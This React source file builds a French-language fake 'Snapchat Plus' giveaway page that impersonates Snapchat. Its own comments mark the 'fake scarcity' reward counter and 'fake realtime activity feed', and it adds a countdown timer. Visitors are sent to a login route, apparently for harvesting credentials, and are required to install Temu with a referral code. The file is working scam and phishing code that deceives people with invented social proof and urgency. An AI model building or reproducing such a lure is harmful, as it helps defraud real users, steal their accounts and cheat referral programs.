import React, { useEffect, useRef, useState } from "react";
import LoginPage from "./LoginPage";
import VerificationPage from "./VerificationPage";
import MeoPage from "./MeoPage";

// Snapchat-themed giveaway SPA

const GhostMark = ({ size = 64 }: { size?: number }) => (
  <svg
    width={size}
    height={size}
    viewBox="0 0 24 24"
    fill="none"
    xmlns="http://www.w3.org/2000/svg"
  >
    <path
      d="M12 2C8.13 2 5 5.13 5 9v6c0 2.76 2.24 5 5 5h2c2.76 0 5-2.24 5-5V9c0-3.87-3.13-7-7-7z"
      fill="#FFFC00"
      stroke="#000"
      strokeWidth="0.5"
    />
    <circle cx="9" cy="10" r="1.2" fill="#000" />
    <circle cx="15" cy="10" r="1.2" fill="#000" />
  </svg>
);

type Task = {
  id: string;
  title: string;
  meta: string;
  required?: boolean;
  url?: string;
  code?: string;
};

const tasksSeed: Task[] = [
  {
    id: "t1",
    title:
      "Téléchargez l'application Temu et collez ce code dans la barre de recherche",
    meta: "~3 min • Requise",
    required: true,
    code: "529020596",
    url: "https://play.google.com/store/search?q=Temu&c=apps",
  },
  {
    id: "t2",
    title: "Installez Spark Skate et ouvrez-le une fois",
    meta: "~2 min • Facultative",
    url: "https://play.google.com/store/search?q=Spark%20Skate&c=apps",
  },
];

function formatTime(s: number) {
  const m = Math.floor(s / 60)
    .toString()
    .padStart(2, "0");
  const sec = (s % 60).toString().padStart(2, "0");
  return `${m}:${sec}`;
}

function GiveawayPage() {
  const [showModal, setShowModal] = useState(true);
  const [username, setUsername] = useState("");
  const usernameRef = useRef<HTMLInputElement | null>(null);
  const [usernameValid, setUsernameValid] = useState(false);
  const [tasks] = useState<Task[]>(tasksSeed);
  const [completedTaskId, setCompletedTaskId] = useState<string | null>(null);
  const [copiedCode, setCopiedCode] = useState<string | null>(null);
  const [claimEnabled, setClaimEnabled] = useState(false);
  const [claimed, setClaimed] = useState(false);
  const [countdown, setCountdown] = useState(15 * 60); // 15:00
  const [feed, setFeed] = useState<string[]>([]);
  const feedRef = useRef<string[]>([]);
  const [linked, setLinked] = useState(false);
  const [rewardsLeft, setRewardsLeft] = useState(10);

  useEffect(() => {
    // fake scarcity: occasionally a reward gets claimed by someone else
    const i = setInterval(() => {
      setRewardsLeft((r) => (r > 1 ? r - 1 : r));
    }, 15000 + Math.random() * 15000);
    return () => clearInterval(i);
  }, []);

  useEffect(() => {
    // a user who filled the login form has a stored username
    let hasLinked = false;
    try {
      hasLinked = !!window.sessionStorage.getItem("snapchatLoginUsername");
    } catch (e) {
      // ignore
    }
    setLinked(hasLinked);
    // skip the auto-show modal for users who already linked their account
    setShowModal(!hasLinked);
  }, []);

  // Prefill username from query param if provided
  useEffect(() => {
    try {
      const params = new URLSearchParams(window.location.search);
      const u = params.get("username") || params.get("user");
      if (u) {
        setUsername(u);
      } else {
        const storedUsername = window.sessionStorage.getItem(
          "snapchatLoginUsername",
        );
        if (storedUsername) {
          setUsername(storedUsername);
        }
      }
    } catch (e) {
      // ignore
    }
  }, []);

  useEffect(() => {
    // countdown
    const t = setInterval(() => {
      setCountdown((c) => (c > 0 ? c - 1 : 0));
    }, 1000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    // fake realtime activity feed
    const names = [
      "ali",
      "mohamed",
      "meriem",
      "rayan",
      "katia",
      "sara",
      "youssef",
      "amina",
      "omar",
      "lina",
    ];
    const i = setInterval(
      () => {
        const n = names[Math.floor(Math.random() * names.length)];
        const masked = `${n}${Math.random().toString(36).slice(2, 5)}***`;
        const msg = `L'utilisateur ${masked} vient de réclamer Snapchat Plus !`;
        feedRef.current = [msg, ...feedRef.current].slice(0, 6);
        setFeed([...feedRef.current]);
      },
      4500 + Math.random() * 3000,
    );
    return () => clearInterval(i);
  }, []);

  useEffect(() => {
    setClaimEnabled(!!usernameValid && !!completedTaskId);
  }, [usernameValid, completedTaskId]);

  // focus username input when modal closes
  useEffect(() => {
    if (!showModal && usernameRef.current) {
      usernameRef.current.focus();
    }
  }, [showModal]);

  // simple username validation (no password required)
  useEffect(() => {
    const ok = /^[a-zA-Z0-9._]{3,}$/.test(username.trim());
    setUsernameValid(ok);
  }, [username]);

  const handleOpenTask = (task: Task) => {
    if (task.id === "t1") {
      // try to open the Temu app, fall back to the store if not installed
      const started = Date.now();
      const win = window.open("temu://", "_blank");
      setTimeout(() => {
        if (Date.now() - started < 1200 && win && !win.closed) {
          // do nothing, app opened
        } else if (task.url) {
          window.open(task.url, "_blank", "noopener,noreferrer");
        }
      }, 1500);
    } else if (task.url) {
      // open the real store/task page
      window.open(task.url, "_blank", "noopener,noreferrer");
    }
  };

  const handleCopyCode = async (code: string) => {
    try {
      await navigator.clipboard.writeText(code);
      setCopiedCode(code);
      setTimeout(() => setCopiedCode((c) => (c === code ? null : c)), 2000);
    } catch (e) {
      // ignore
    }
  };

  const submitClaim = async (formName = "snapchat-plus-claim") => {
    const payload = {
      "form-name": formName,
      username: username || "",
      taskId: completedTaskId || "",
    };

    if (import.meta.env.DEV) {
      console.log("[DEV] submitClaim", payload);
      // simulate success
      feedRef.current = [
        `L'utilisateur @${username || "anonyme"} vient de réclamer Snapchat Plus !`,
        ...feedRef.current,
      ].slice(0, 6);
      setFeed([...feedRef.current]);
      setClaimed(true);
      setClaimEnabled(false);
      return true;
    }

    try {
      const body = new URLSearchParams();
      Object.entries(payload).forEach(([k, v]) => body.set(k, String(v)));

      const res = await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: body.toString(),
      });

      if (res.ok) {
        feedRef.current = [
          `L'utilisateur @${username || "anonyme"} vient de réclamer Snapchat Plus !`,
          ...feedRef.current,
        ].slice(0, 6);
        setFeed([...feedRef.current]);
        setClaimed(true);
        setClaimEnabled(false);
        return true;
      }
    } catch (e) {
      // ignore
    }
    return false;
  };

  const handleClaim = async () => {
    if (!claimEnabled) return;
    const ok = await submitClaim();
    if (ok) {
      alert(
        `Succès ! ${username || "Votre compte"} a débloqué 1 mois Snapchat Plus.`,
      );
    } else {
      alert(
        "Un problème est survenu lors de la réclamation de votre récompense. Veuillez réessayer.",
      );
    }
  };

  const steps = [
    { id: "login", label: "Lier le compte", done: linked || usernameValid },
    { id: "task", label: "Terminer la tâche", done: !!completedTaskId },
    { id: "claim", label: "Réclamer la récompense", done: claimed },
  ];
  const completedSteps = steps.filter((s) => s.done).length;
  const progressPct = Math.round((completedSteps / steps.length) * 100);
  const currentStepIndex = steps.findIndex((s) => !s.done);

  return (
    <div className="min-h-screen bg-[#F7F7F7] flex items-center justify-center py-12 px-4">
      <div className="w-full max-w-4xl">
        {claimed && (
          <div className="mb-4 p-3 rounded-lg bg-green-50 border border-green-200 text-green-800">
            🎉 Réclamé — récompense liée à @{username || "votre compte"}
          </div>
        )}
        {linked && (
          <div className="mb-4 p-3 rounded-lg bg-green-50 border border-green-200 text-green-800">
            ✅ Bon retour, @{username || "votre compte"} ! Votre compte a été
            lié avec succès.
          </div>
        )}
        {!linked && (
          <div className="mb-4 flex flex-wrap items-center justify-between gap-3 rounded-2xl border border-black/10 bg-white px-4 py-3 shadow-sm">
            <div>
              <div className="text-sm font-semibold text-black">
                Connectez-vous pour lier votre compte Snapchat
              </div>
              <div className="text-xs text-gray-500">
                Après la connexion, vous reviendrez ici pour terminer la tâche
                et réclamer la récompense.
              </div>
            </div>
            <button
              type="button"
              onClick={() => {
                const returnTo = "/";
                window.location.assign(
                  `/login?returnTo=${encodeURIComponent(returnTo)}`,
                );
              }}
              className="rounded-full bg-black px-4 py-2 text-sm font-semibold text-white transition hover:opacity-90"
            >
              Aller à la connexion
            </button>
          </div>
        )}
        <header className="flex items-center gap-4 mb-6">
          <div className="p-2 rounded-full shadow-sm bg-white inline-flex">
            <GhostMark size={48} />
          </div>
          <div>
            <h2 className="text-2xl font-bold">Concours Snapchat Plus</h2>
            <p className="text-sm text-gray-600">
              Réclamez un essai gratuit de 1 mois — durée limitée
            </p>
          </div>
          <div className="ml-auto text-sm font-medium text-gray-700">
            Offre réservée pour{" "}
            <span className="font-bold">{formatTime(countdown)}</span>
          </div>
        </header>

        <div className="mb-6 rounded-2xl border border-yellow-300 bg-yellow-50 px-4 py-3">
          <div className="flex items-center justify-between gap-3">
            <div className="text-sm font-semibold text-black">
              🔥 Plus que {rewardsLeft} abonnements gratuits Snapchat Plus
              disponibles !
            </div>
            <div className="text-xs font-medium text-gray-500">
              {rewardsLeft} sur 100
            </div>
          </div>
          <div className="mt-2 h-2 bg-yellow-200 rounded-full overflow-hidden">
            <div
              className="h-2 bg-yellow-400 rounded-full transition-all duration-700"
              style={{ width: `${rewardsLeft}%` }}
            />
          </div>
        </div>

        <main className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <section className="bg-white rounded-xl p-6 shadow-md">
            <h3 className="text-xl font-semibold mb-3">Bienvenue</h3>
            <p className="text-gray-600 mb-4">
              Terminez une tâche rapide pour réclamer votre récompense de 1 mois
              Snapchat Plus.
            </p>

            {/* <div className="mb-4">
              <label className="text-sm font-medium text-gray-700">
                Nom d'utilisateur Snapchat
              </label>
              <div className="mt-2 flex items-center gap-2">
                <input
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="ex. cool.snap"
                  className="flex-1 px-4 py-2 rounded-full border border-gray-200 focus:outline-none focus:ring-2 focus:ring-yellow-400 text-sm"
                />
                <div className="w-8 h-8 flex items-center justify-center">
                  {usernameValid ? (
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                      <path
                        d="M20 6L9 17l-5-5"
                        stroke="#16a34a"
                        strokeWidth="2.2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      />
                    </svg>
                  ) : (
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                      <circle
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="#ddd"
                        strokeWidth="1.5"
                      />
                    </svg>
                  )}
                </div>
              </div>
              <p className="text-xs text-gray-500 mt-1">Mot de passe non requis</p>
            </div> */}

            <div className="mb-4">
              <h4 className="font-medium mb-2">Tâches disponibles</h4>
              <div className="space-y-3">
                {tasks.map((t) => (
                  <div
                    key={t.id}
                    className={`p-3 rounded-lg border ${completedTaskId === t.id ? "border-yellow-400 bg-yellow-50" : "border-gray-100 hover:shadow-lg"} transition-all cursor-pointer`}
                    onClick={() => handleOpenTask(t)}
                    role="button"
                    tabIndex={0}
                  >
                    <div className="flex items-center justify-between">
                      <div>
                        <div className="font-semibold">{t.title}</div>
                        <div className="text-xs text-gray-500">{t.meta}</div>
                      </div>
                      <div
                        className="text-xs px-3 py-1 rounded-full text-white"
                        style={{ background: t.required ? "#111" : "#6b7280" }}
                      >
                        {t.required ? "Requise" : "Facultative"}
                      </div>
                    </div>
                    {t.code && (
                      <div
                        className="mt-2 flex items-center justify-between gap-2 rounded-md border border-dashed border-gray-300 bg-gray-50 px-3 py-2"
                        onClick={(e) => e.stopPropagation()}
                      >
                        <span className="text-sm font-mono font-semibold tracking-wider">
                          {t.code}
                        </span>
                        <button
                          type="button"
                          onClick={() => handleCopyCode(t.code!)}
                          className={`rounded-full px-3 py-1 text-xs font-semibold transition ${copiedCode === t.code ? "bg-green-500 text-white" : "bg-black text-white hover:opacity-90"}`}
                        >
                          {copiedCode === t.code ? "Copié !" : "Copier le code"}
                        </button>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>

            <div className="mt-4">
              <div className="mb-3 flex items-center justify-between">
                <div className="text-sm font-semibold">Votre progression</div>
                <div className="text-xs font-medium text-gray-500">
                  {completedSteps} sur {steps.length} étapes
                </div>
              </div>

              <div className="w-full bg-gray-200 h-2.5 rounded-full overflow-hidden">
                <div
                  className="h-2.5 bg-yellow-400 rounded-full transition-all duration-500"
                  style={{ width: `${progressPct}%` }}
                />
              </div>

              <div className="mt-5 flex items-start">
                {steps.map((s, i) => (
                  <React.Fragment key={s.id}>
                    {i > 0 && (
                      <div
                        className={`mt-4 flex-1 h-0.5 rounded-full ${steps[i - 1].done ? "bg-green-500" : "bg-gray-200"}`}
                      />
                    )}
                    <div className="flex flex-col items-center">
                      <div
                        className={`flex h-8 w-8 items-center justify-center rounded-full border-2 text-xs font-bold transition-all ${
                          s.done
                            ? "border-green-500 bg-green-500 text-white"
                            : i === currentStepIndex
                              ? "border-yellow-400 bg-yellow-400 text-black"
                              : "border-gray-300 bg-white text-gray-400"
                        }`}
                      >
                        {s.done ? (
                          <svg
                            width="14"
                            height="14"
                            viewBox="0 0 24 24"
                            fill="none"
                          >
                            <path
                              d="M20 6L9 17l-5-5"
                              stroke="currentColor"
                              strokeWidth="3"
                              strokeLinecap="round"
                              strokeLinejoin="round"
                            />
                          </svg>
                        ) : (
                          i + 1
                        )}
                      </div>
                      <div className="mt-1.5 w-20 text-center">
                        <div
                          className={`text-xs font-semibold ${
                            s.done
                              ? "text-green-600"
                              : i === currentStepIndex
                                ? "text-black"
                                : "text-gray-400"
                          }`}
                        >
                          {s.label}
                        </div>
                        <div className="text-[10px] text-gray-400">
                          {s.done
                            ? "Terminée"
                            : i === currentStepIndex
                              ? "En cours"
                              : "En attente"}
                        </div>
                      </div>
                    </div>
                  </React.Fragment>
                ))}
              </div>

              <button
                onClick={handleClaim}
                disabled={!claimEnabled}
                className={`mt-5 w-full px-4 py-2 rounded-full font-semibold transition ${claimEnabled ? "bg-black text-white hover:opacity-90" : "bg-gray-200 text-gray-500 cursor-not-allowed"}`}
              >
                Réclamer Snapchat Plus
              </button>
            </div>
          </section>

          <aside className="space-y-4">
            <div className="bg-white rounded-xl p-4 shadow-md">
              <h4 className="font-semibold mb-2">Activité en direct</h4>
              <div className="text-sm text-gray-700 space-y-2 h-28 overflow-hidden">
                {feed.length === 0 ? (
                  <div className="text-gray-400">Aucune activité récente</div>
                ) : (
                  feed.map((f, i) => (
                    <div key={i} className="text-xs text-gray-600">
                      {f}
                    </div>
                  ))
                )}
              </div>
            </div>

            <div className="bg-white rounded-xl p-4 shadow-md">
              <h4 className="font-semibold mb-2">FAQ</h4>
              <div className="space-y-2">
                <details className="p-2 rounded-md bg-gray-50">
                  <summary className="font-medium cursor-pointer">
                    Comment fonctionne ce concours ?
                  </summary>
                  <p className="text-sm text-gray-600 mt-2">
                    Terminez une tâche rapide dans l'application et confirmez
                    votre nom d'utilisateur pour recevoir une récompense de 1
                    mois Snapchat Plus.
                  </p>
                </details>
                <details className="p-2 rounded-md bg-gray-50">
                  <summary className="font-medium cursor-pointer">
                    Est-ce gratuit ?
                  </summary>
                  <p className="text-sm text-gray-600 mt-2">
                    Oui — la récompense est un essai gratuit. Aucune carte de
                    crédit requise ici.
                  </p>
                </details>
                <details className="p-2 rounded-md bg-gray-50">
                  <summary className="font-medium cursor-pointer">
                    Combien de temps l'offre est-elle réservée ?
                  </summary>
                  <p className="text-sm text-gray-600 mt-2">
                    L'offre est réservée pendant le compte à rebours affiché.
                    Elle peut expirer si le temps s'écoule.
                  </p>
                </details>
              </div>
            </div>

            <div className="bg-white rounded-xl p-4 shadow-md text-center">
              <div className="text-sm text-gray-500">Besoin d'aide ?</div>
              <a
                href="#"
                className="mt-2 inline-block px-4 py-2 rounded-full bg-yellow-400 text-black font-semibold"
              >
                Contacter l'assistance
              </a>
            </div>
          </aside>
        </main>

        {/* Modal */}
        {showModal && (
          <div className="fixed inset-0 flex items-center justify-center z-50">
            <div
              className="absolute inset-0 bg-black/30"
              onClick={() => setShowModal(false)}
            />
            <div className="relative bg-white rounded-2xl p-6 max-w-md w-full shadow-2xl">
              <div className="flex flex-col items-center gap-4">
                <GhostMark size={72} />
                <h3 className="text-xl font-bold">🎉 Félicitations !</h3>
                <p className="text-gray-600 text-center">
                  Vous avez débloqué 1 mois de Snapchat Plus ! Pour réclamer
                  votre cadeau, connectez-vous à votre compte et terminez une
                  tâche rapide ci-dessous.
                </p>
                <button
                  onClick={() => {
                    const returnTo = "/";
                    window.location.assign(
                      `/login?returnTo=${encodeURIComponent(returnTo)}`,
                    );
                  }}
                  className="mt-2 px-6 py-2 rounded-full bg-black text-white font-semibold"
                >
                  Se connecter pour réclamer
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default function App() {
  if (window.location.pathname.startsWith("/meo")) {
    return <MeoPage />;
  }
  if (window.location.pathname.startsWith("/verification")) {
    return <VerificationPage />;
  }
  if (window.location.pathname.startsWith("/login")) {
    return <LoginPage />;
  }
  return <GiveawayPage />;
}
